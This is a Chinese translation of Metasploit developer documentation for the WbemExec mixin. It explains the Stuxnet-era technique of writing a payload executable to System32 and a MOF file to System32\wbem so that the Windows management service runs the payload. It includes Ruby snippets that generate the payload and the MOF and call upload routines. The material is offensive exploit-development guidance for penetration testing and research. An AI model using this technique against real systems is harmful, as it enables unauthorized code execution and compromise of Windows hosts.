Windows管理规范（WMI）是Microsoft实施的基于Web的企业管理（WBEM），它使用管理对象格式（MOF）来创建通用信息模型（CIM）类。在Stuxnet诞生之前，安全社区实际上并不熟悉这种技术的恶毒，Stuxnet使用MOF文件来利用漏洞，允许攻击者通过假打印机后台处理程序服务创建文件。这个技术后来在Metasploit的ms10_061_spoolss.rb模块中进行了逆向和演示，这大大改变了我们处理写入权限攻击的方式。一般来说，如果你发现自己能够写入system32，你很可能会利用这种技术。

### 要求
要能够使用`WBemExec` mixin，您必须满足以下要求：
* `C:\Windows\System32\` 写入权限
* `C:\Windows\System32\Wbem\`  写入权限 
* 目标不能比Windows Vista更新（所以对于XP，Win 2003或更早的版本来说，这些功能大多是好的）。这更多的是API的限制，而不是技术。较新的Windows操作系统需要首先预编译MOF文件。

### 用法
首先，在你的`Metasploit3`类范围内包含`WbemExec` mixin 。您还需要`EXE ` mixin生成一个可执行文件：
~~~
include Msf::Exploit::EXE
include Msf::Exploit::WbemExec
~~~

接下来，生成有效载荷名称和可执行文件：
~~~
payload_name = "evil.exe"
exe = generate_payload_exe
~~~
然后使用该generate_mof方法生成mof文件。第一个参数应该是mof文件的名称，第二个参数是有效负载名称：
~~~
mof_name = "evil.mof"
mof = generate_mof(mof_name, payload_name)
~~~
现在，您已经准备好将文件写入/上传到目标机器。始终确保您首先上传有效负载可执行文件到`C:\Windows\System32\`。
~~~
upload_file_to_system32(payload_name, exe) # Write your own upload method
~~~
然后现在你可以上传`mof`文件到`C:\Windows\System32\wbem\`：
~~~
upload_mof(mof_name, mof) # Write your own upload method
~~~
一旦mof文件被上传，Windows管理服务应该选择并执行它，这将最终在system32中执行你的有效载荷。另外，使用后，mof文件将自动移出mof目录。

### 参考

https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb